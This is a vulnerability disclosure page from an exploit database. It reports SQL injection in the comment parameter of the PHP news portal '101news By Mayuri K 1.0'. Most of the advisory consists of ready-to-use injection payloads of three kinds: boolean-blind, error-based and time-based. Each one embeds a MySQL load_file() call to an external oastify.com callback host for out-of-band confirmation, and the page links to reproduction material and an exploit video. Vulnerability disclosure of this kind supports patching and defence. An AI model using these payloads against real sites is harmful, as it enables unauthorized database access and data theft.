---
title: 101news By Mayuri K 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2023020025
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-15
fetch_date: 2025-10-04T06:36:11.861616
---

# 101news By Mayuri K 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **101news By Mayuri K 1.0 SQL Injection** **2023.02.14**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

## Title: 101news-by-Mayuri-K-1.0 Multiple-SQLi
## Author: nu11secur1ty
## Date: 02.02.2023
## Vendor: https://mayurik.com/
## Software: https://mayurik.com/source-code/P4030/news-portal-project-in-php
## Reference: https://portswigger.net/web-security/sql-injection
## Description:
The `comment` parameter appears to be vulnerable to SQL injection attacks.
The payload '+(select
load\_file('\\\\1km7b3i42qkp4m2iy5ryphiobfh85zynpqdi0bo0.oastify.com\\bxf'))+'
was submitted in the comment parameter.
This payload injects a SQL sub-query that calls MySQL's load\_file
function with a UNC file path that references a URL on an external
domain.
The application interacted with that domain, indicating that the
injected SQL query was executed. This system is absolutely
UNPROTECTED!
STATUS: HIGH Vulnerability
[+]Payload:
```mysql
---
Parameter: comment (POST)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY
or GROUP BY clause
Payload: csrftoken=6606c0284475034686192a71b81d3e9360096c1bc0fa486d4a8636d582e2b0c5&name=IRSaszTW&email=YxpqSxQd@burpcollaborator.net&comment=167565'+(select
load\_file('\\\\1km7b3i42qkp4m2iy5ryphiobfh85zynpqdi0bo0.oastify.com\\bxf'))+''
RLIKE (SELECT (CASE WHEN (1140=1140) THEN 0x313637353635+(select
load\_file(0x5c5c5c5c316b6d376233693432716b70346d3269793572797068696f62666838357a796e7071646930626f302e6f6173746966792e636f6d5c5c627866))+''
ELSE 0x28 END)) AND 'RBgF'='RBgF&submit=
Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or
GROUP BY clause (FLOOR)
Payload: csrftoken=6606c0284475034686192a71b81d3e9360096c1bc0fa486d4a8636d582e2b0c5&name=IRSaszTW&email=YxpqSxQd@burpcollaborator.net&comment=167565'+(select
load\_file('\\\\1km7b3i42qkp4m2iy5ryphiobfh85zynpqdi0bo0.oastify.com\\bxf'))+''
AND (SELECT 4135 FROM(SELECT COUNT(\*),CONCAT(0x71766b6a71,(SELECT
(ELT(4135=4135,1))),0x7171627071,FLOOR(RAND(0)\*2))x FROM
INFORMATION\_SCHEMA.PLUGINS GROUP BY x)a) AND 'iMBs'='iMBs&submit=
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: csrftoken=6606c0284475034686192a71b81d3e9360096c1bc0fa486d4a8636d582e2b0c5&name=IRSaszTW&email=YxpqSxQd@burpcollaborator.net&comment=167565'+(select
load\_file('\\\\1km7b3i42qkp4m2iy5ryphiobfh85zynpqdi0bo0.oastify.com\\bxf'))+''
AND (SELECT 1879 FROM (SELECT(SLEEP(3)))AQLB) AND 'asLq'='asLq&submit=
---
```
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/mayuri\_k/2023/101news)
## Proof and Exploit:
[href](https://streamable.com/vrc7x8)
## Time spend:
01:00:00

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020025)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top